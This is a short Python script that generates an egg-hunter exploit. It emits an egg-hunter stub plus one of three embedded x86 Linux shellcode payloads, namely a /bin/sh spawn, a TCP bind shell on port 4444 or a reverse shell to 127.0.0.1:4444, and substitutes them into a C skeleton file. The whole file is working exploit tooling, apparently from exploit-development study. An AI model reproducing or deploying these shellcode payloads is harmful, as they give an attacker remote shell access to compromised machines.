#!/usr/bin/env python

import sys, getopt, binascii, fileinput, re;

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-s, --shell: use /bin/sh shellcode"
    print "\t-b, --bind-shell: use a TCP bind shell shellcode on port 4444"
    print "\t-r, --reverse-shell: use a TCP reverse shell shellcode on 127.0.0.1 on port 4444"
    print "\t-e, --egg=the_egg_string: use the given string as egg in memory"
    return 0

def main(argv):

    try:
        opts, args=getopt.getopt(argv, "hsbre:", ["help", "shell", "bind-shell", "reverse-shell", "egg="])
    except getopt.GetoptError:
        help()
        sys.exit(1)

    egg = "\\xef\\xbe\\xad\\xde"
    default_shellcode="\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x50\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    shellcode=egg+egg+default_shellcode

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-s', '--shell'):
            shellcode=egg+egg+default_shellcode
        elif opt in ('-b', '--bind-shell'):
            shellcode=egg+egg+"\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
        elif opt in ('-r', '--reverse-shell'):
            shellcode=egg+egg+"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\xb8\\x80\\xff\\xff\\xfe\\x83\\xf0\\xff\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x31\\xc0\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x85\\xc0\\x75\\x24\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xb3\\x01\\x31\\xc0\\xb0\\x01\\xcd\\x80"
        elif opt in ('-e', '--egg'):
            egg=repr(binascii.unhexlify(arg[::-1])).strip("'")

    egg_hunter="\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x31\\xc0\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x74\\xed\\xb8"+egg+"\\x89\\xd7\\xaf\\x75\\xe8\\xaf\\x75\\xe5\\xff\\xe7";

    sys.stderr.write("Egg Hunter: " + egg_hunter+"\n")
    sys.stderr.write("Shellcode:  " +shellcode+"\n")

    with open('skeleton.c', 'r') as file :
        filedata=file.read()
    filedata = filedata.replace("EGG_HUNTER", egg_hunter)
    filedata = filedata.replace("CODE", shellcode)

    print filedata

if __name__ == "__main__":
    main(sys.argv[1:])
